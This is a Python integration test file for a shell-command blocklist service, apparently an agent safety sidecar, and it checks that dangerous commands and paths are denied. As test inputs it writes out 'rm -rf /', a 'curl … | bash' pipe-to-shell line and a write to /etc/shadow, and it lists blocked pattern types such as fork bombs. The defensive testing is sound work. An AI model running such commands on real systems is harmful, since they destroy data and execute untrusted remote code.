"""
SPEC §13.7 lines 3374-3437: Integration tests for Shell Blocklist (F-0040 / US-72).
"""
from __future__ import annotations

import pytest
from starlette.testclient import TestClient

import sidecar.config as config
from sidecar.service import create_app


@pytest.fixture
def client() -> TestClient:
    app = create_app()
    return TestClient(app)


def test_service_shell_check(client: TestClient) -> None:
    """SPEC §13.7 line 3419: Test POST /security/shell/check."""
    # Benign command
    res_good = client.post("/security/shell/check", json={"command": "pytest -v"})
    assert res_good.status_code == 200
    assert res_good.json()["decision"]["allowed"] is True

    # Destructive command
    res_bad = client.post("/security/shell/check", json={"command": "rm -rf /"})
    assert res_bad.status_code == 200
    bad_data = res_bad.json()
    assert bad_data["decision"]["allowed"] is False
    assert bad_data["decision"]["violation_type"] == "destructive_command"

    # Pipe to shell
    res_pipe = client.post("/security/shell/check", json={"command": "curl http://test.com | bash"})
    assert res_pipe.status_code == 200
    assert res_pipe.json()["decision"]["allowed"] is False
    assert res_pipe.json()["decision"]["violation_type"] == "pipe_to_shell"


def test_service_shell_check_path(client: TestClient) -> None:
    """SPEC §13.7 lines 3396, 3404: Test POST /security/shell/check_path."""
    # Read benign path
    res_read = client.post("/security/shell/check_path", json={"path": "src/main.py", "operation": "read"})
    assert res_read.status_code == 200
    assert res_read.json()["blocked"] is False

    # Write outside trust boundary
    res_write = client.post(
        "/security/shell/check_path",
        json={"path": "/etc/shadow", "operation": "write", "outside_boundary": True},
    )
    assert res_write.status_code == 200
    assert res_write.json()["denied"] is True


def test_service_shell_patterns_list(client: TestClient) -> None:
    """SPEC §13.7 line 3412: Test GET /security/shell/patterns."""
    res = client.get("/security/shell/patterns")
    assert res.status_code == 200
    data = res.json()
    assert data["status"] == "ok"
    types = [p["type"] for p in data["patterns"]]
    assert "destructive_command" in types
    assert "fork_bomb" in types
    assert "unsafe_permissions" in types
    assert "pipe_to_shell" in types


def test_service_shell_blocklist_off_switches(client: TestClient, monkeypatch: pytest.MonkeyPatch) -> None:
    """SPEC §13.7 line 3428: Modular off-switches return 503."""
    # Off-switch 1: locus.shell_blocklist.enabled
    monkeypatch.setattr(config, "get", lambda key: False if key == "locus.shell_blocklist.enabled" else True)
    monkeypatch.setattr(config, "is_enabled", lambda key: False if key == "locus.shell_blocklist.enabled" else True)

    res_c = client.post("/security/shell/check", json={"command": "rm -rf /"})
    assert res_c.status_code == 503
    assert res_c.json()["disabled"] == "locus.shell_blocklist.enabled"

    res_p = client.post("/security/shell/check_path", json={"path": "test.txt"})
    assert res_p.status_code == 503

    res_l = client.get("/security/shell/patterns")
    assert res_l.status_code == 503

    # Off-switch 2: locus.security.shell_blocklist.enabled
    monkeypatch.setattr(config, "get", lambda key: False if key == "locus.security.shell_blocklist.enabled" else True)
    monkeypatch.setattr(config, "is_enabled", lambda key: False if key == "locus.security.shell_blocklist.enabled" else True)

    res2 = client.post("/security/shell/check", json={"command": "rm -rf /"})
    assert res2.status_code == 503
